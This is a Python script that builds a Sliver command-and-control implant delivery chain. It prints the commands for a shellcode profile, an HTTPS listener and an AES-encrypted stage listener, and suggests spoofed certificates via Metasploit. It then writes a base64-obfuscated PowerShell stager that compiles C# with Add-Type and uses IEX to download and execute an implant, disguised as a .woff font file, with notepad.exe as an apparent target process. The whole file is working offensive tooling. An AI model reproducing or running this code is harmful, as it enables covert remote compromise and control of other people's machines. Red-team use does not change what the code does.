#!/usr/bin/python3

import os
import secrets
import string
import base64
from pathlib import Path

def parseCSharp(urlFile, targetBinary, hexAESKey, hexAESIV):
    fNew = open("csharp.new", "w")
    f = open("csharp.txt", "r")
    for line in f:
        if "pythonReplaceURL" in line:
            output = line.replace("pythonReplaceURL", urlFile)
        elif "pythonReplaceTargetBinary" in line:
            output = line.replace("pythonReplaceTargetBinary", targetBinary)
        elif "pythonReplaceAESKey" in line:
            output = line.replace("pythonReplaceAESKey", hexAESKey)
        elif "pythonReplaceAESIV" in line:
            output = line.replace("pythonReplaceAESIV", hexAESIV)
        else:
            output = line
        fNew.write(output)
    f.close()
    fNew.close()

def encodeCSharp():
    fNew = open("csharpNew.txt", "w")
    with open("csharp.new", "rb") as f:
        encodedFile = base64.b64encode(f.read())
        encodedFileTXT = encodedFile.decode()
    # Reconstruct the Powershell Script
    #fNew.write("$randInt = Get-Random -Minimum 1000 -Maximum 9999\n")
    fNew.write("$b64code = \"" + encodedFileTXT + "\"\n")
    fNew.write("$code = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($b64code))\n")
    fNew.write("Add-Type -TypeDefinition $code -Language CSharp\n")
    fNew.write("IEX \"[MyLibrary.Class1]::DownloadAndExecute()\"\n")
    fNew.close()

def main():
    #### Change the below parameters as necessary...
    listenerHost = stageListenerHost = "10.27.20.215"
    listenerPort = "18443"
    stageListenerPort = "18080"
    listenerCert = "certs/my.crt"
    listenerKey = "certs/my.key"
    urlListener = "https://" + listenerHost + ":" + listenerPort
    urlStageListener = "https://" + stageListenerHost + ":" + stageListenerPort
    operatingSystem = "windows"
    randomImplantFileName = "sliver-" + operatingSystem + "-implant-" + os.urandom(8).hex()
    aesEncryptKey = (''.join(secrets.choice(string.ascii_letters + string.digits) for i in range(32)))
    aesEncryptIV = (''.join(secrets.choice(string.ascii_letters + string.digits) for i in range(16)))
    csharpFile = "coolrunnings.woff"
    csharpTargetBinary = "notepad.exe"
    csharpURL = "https://" + stageListenerHost + ":" + stageListenerPort + "/" + csharpFile
    hexAES = ""
    hexAESIV = ""
    for c in aesEncryptKey:
        hexAES += hex(ord(c)) + ","
    for c in aesEncryptIV:
        hexAESIV += hex(ord(c)) + ","

    print('\n[*] Run the following command to build the profile: ')
    saveProfileCommand = "profiles new -b " + urlListener + " --format shellcode --arch amd64 " + randomImplantFileName
    print("[*] Command: " + saveProfileCommand)

    print("\n[*] Generate certificates with metasploit using auxiliary/gather/impersonate_ssl which are used to create the listener")

    print('[*] Create a Listener with the following command - ' + listenerPort)
    createListenerCommand = "https -L " + listenerHost + " -l " + listenerPort + " -c " + listenerCert + " -k " + listenerKey
    print("[*] Command: " + createListenerCommand)

    print('\n[*] To Create a Stage Listener AES this command needs to be executed')
    command = "stage-listener --url " + urlStageListener + " --profile " + randomImplantFileName + " -c " + listenerCert
    command += " -k " + listenerKey + " -C deflate9 --aes-encrypt-key " + aesEncryptKey + " --aes-encrypt-iv " + aesEncryptIV
    print("\n" + command)

    print("\n[*] Created a new powershell script to be executed with the above parameters")
    print("[*] The script is called csharpNew.txt in this directory")
    parseCSharp(csharpURL, csharpTargetBinary, hexAES[:-1], hexAESIV[:-1])
    encodeCSharp()

if __name__ == '__main__':
    main()

